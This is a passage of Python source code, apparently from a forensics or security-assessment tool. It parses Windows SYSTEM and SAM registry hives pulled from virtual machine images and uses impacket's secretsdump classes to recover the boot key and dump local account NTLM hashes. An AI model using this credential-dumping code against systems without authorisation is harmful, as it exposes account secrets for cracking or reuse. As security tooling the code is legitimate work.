        not duplicated here.
        """
        if not extracted.get("SYSTEM"):
            return [], None, ["SYSTEM hive missing; skipped hive parsing."]
        local_operations_cls, sam_hashes_cls = _load_impacket_local_sam()
        try:
            boot_key = local_operations_cls(extracted["SYSTEM"]).getBootKey()
        except Exception as exc:  # noqa: BLE001 - bootkey read failure is non-fatal
            telemetry.capture_exception(exc)
            return [], None, [f"Bootkey read failed: {exc}"]
        bootkey = boot_key.hex() if isinstance(boot_key, (bytes, bytearray)) else None

        credentials: list[VMCredential] = []
        notes: list[str] = []
        if extracted.get("SAM"):
            collected: list[str] = []
            try:
                sam = sam_hashes_cls(
                    extracted["SAM"],
                    boot_key,
                    isRemote=False,
                    perSecretCallback=lambda secret: collected.append(secret),
                )
                sam.dump()
                try:
                    sam.finish()
                except Exception:  # noqa: BLE001 - finish() is best-effort cleanup
                    pass
            except Exception as exc:  # noqa: BLE001 - SAM parse failure is non-fatal
                telemetry.capture_exception(exc)
                notes.append(f"SAM hive parsing failed: {exc}")
            for line in collected:
                parsed = _parse_secretsdump_ntlm_line(line, kind="local", source="SAM")
                if parsed is not None:
                    credentials.append(parsed)

        return credentials, bootkey, notes


def _load_impacket_local_sam() -> tuple[Any, Any]:
    """Lazily import impacket's offline bootkey + SAM API (monkeypatchable)."""
    module = importlib.import_module("impacket.examples.secretsdump")
    return module.LocalOperations, module.SAMHashes


def _dedupe_credentials(credentials: list[VMCredential]) -> list[VMCredential]:
    """Stable-dedupe credentials by (kind, principal, rid, nt_hash)."""
    seen: set[tuple[str, str, int | None, str | None]] = set()
    result: list[VMCredential] = []
    for cred in credentials:
        key = (cred.kind, cred.principal.casefold(), cred.rid, cred.nt_hash)
        if key in seen:
            continue
        seen.add(key)
        result.append(cred)
    return result
